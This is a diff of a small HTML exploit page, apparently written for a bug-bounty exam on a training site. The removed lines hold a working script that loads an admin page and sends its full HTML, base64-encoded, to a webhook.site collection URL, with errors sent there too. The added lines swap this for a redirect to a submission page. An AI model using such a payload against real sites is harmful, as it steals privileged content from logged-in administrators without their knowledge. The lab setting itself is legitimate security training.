@@ -1,24 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Exploit</title>
-</head>
 <body>
     <script>
-        // We use 'credentials: include' to make sure the admin's session is sent
-        // Change the URL below to the exact page where the flag/message is located
-        const targetUrl = "https://bugbounty-exam.hashacademy.co/admin/view/69e29e17bee6d6b7c6629c63";
-
-        fetch(targetUrl)
-            .then(response => response.text())
-            .then(content => {
-                // We send the entire HTML of the admin page to your webhook
-                // Using btoa() to encode it so it doesn't break the URL
-                fetch("https://webhook.site/82f191e4-653a-4a2c-99d4-872bc4426e85/?data=" + btoa(unescape(encodeURIComponent(content))));
-            })
-            .catch(err => {
-                fetch("https://webhook.site/82f191e4-653a-4a2c-99d4-872bc4426e85/?error=" + btoa(err));
-            });
+        // Replace 12345 with the actual ID of your submission
+        window.location.href = "https://bugbounty-exam.hashacademy.co/view.php?id=69e2a168bee6d6b7c6629d63";
     </script>
 </body>
 </html>
